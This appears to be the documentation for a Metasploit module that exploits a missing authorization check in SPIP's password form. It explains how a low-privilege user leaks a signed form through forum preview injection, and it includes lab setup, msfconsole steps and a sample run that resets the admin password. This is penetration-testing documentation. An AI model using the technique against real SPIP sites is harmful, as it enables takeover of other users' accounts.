## Vulnerable Application

SPIP before 4.4.23 has a missing authorization check in the `mot_de_passe`
CVT form handler. The `traiter` function changes any user's password when
given a validly-signed form POST, without verifying the caller is authorized
for that `id_auteur`. An authenticated user can obtain a valid signature by
injecting the SPIP model tag `<formulaire|mot_de_passe|id_auteur=N>` into
a forum message preview, which causes the server to render and HMAC-sign the
password form for user N. The preview replaces `<form>` tags with `<div>` but
leaves hidden inputs intact, leaking the signed arguments.

Affected versions: SPIP < 4.4.23 (with forum plugin < 3.1.17).
Fixed in: SPIP 4.4.23 / forum plugin 3.1.17.

### Install

Download SPIP 4.4.20 from https://files.spip.net/spip/archives/ and extract it:

```
wget https://files.spip.net/spip/archives/SPIP-v4.4.20.zip
unzip SPIP-v4.4.20.zip -d spip
cd spip
php -S 127.0.0.1:8082
```

Complete the web-based setup at `http://127.0.0.1:8082/ecrire/` to create
the admin account. Then create a second low-privilege user (status `1comite`
or `6forum`) via the admin panel under Authors.

## Verification Steps

1. Install SPIP <= 4.4.22
2. Create an admin account and a low-privilege account
3. Start msfconsole
4. Do: `use auxiliary/admin/http/spip_idor_password_reset`
5. Do: `set RHOSTS [ip]`
6. Do: `set RPORT [port]`
7. Do: `set USERNAME [low-priv username]`
8. Do: `set PASSWORD [low-priv password]`
9. Do: `set TARGET_ID 1`
10. Do: `run`
11. The admin's password should be changed to the printed value.

## Options

### USERNAME

Username of any authenticated SPIP account. Even the lowest privilege level
(`6forum`) is sufficient.

### PASSWORD

Password for the SPIP account specified in USERNAME.

### TARGET_ID

The `id_auteur` of the user whose password to change. Defaults to `1`, which
is typically the webmaster/admin account.

### NEW_PASSWORD

The new password to set on the target account. If left blank, a random
16-character alphanumeric password is generated.

## Scenarios

### SPIP 4.4.20 on PHP 8.x

```
msf6 > use auxiliary/admin/http/spip_idor_password_reset
msf auxiliary(admin/http/spip_idor_password_reset) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf auxiliary(admin/http/spip_idor_password_reset) > set RPORT 8082
RPORT => 8082
msf auxiliary(admin/http/spip_idor_password_reset) > set USERNAME lowpriv
USERNAME => lowpriv
msf auxiliary(admin/http/spip_idor_password_reset) > set PASSWORD password
PASSWORD => password
msf auxiliary(admin/http/spip_idor_password_reset) > set TARGET_ID 1
TARGET_ID => 1
msf auxiliary(admin/http/spip_idor_password_reset) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP version: 4.4.20
[+] The target appears to be vulnerable. SPIP 4.4.20 lacks authorization on password change form
[+] Authenticated as 'lowpriv'
[*] Injecting model to render password form for author #1...
[+] Extracted signed password form arguments from preview
[*] Submitting password change for author #1...
[+] Password for author #1 changed to: AGMOdviMKkVUWUpO
[*] Auxiliary module execution completed
msf auxiliary(admin/http/spip_idor_password_reset) >
```
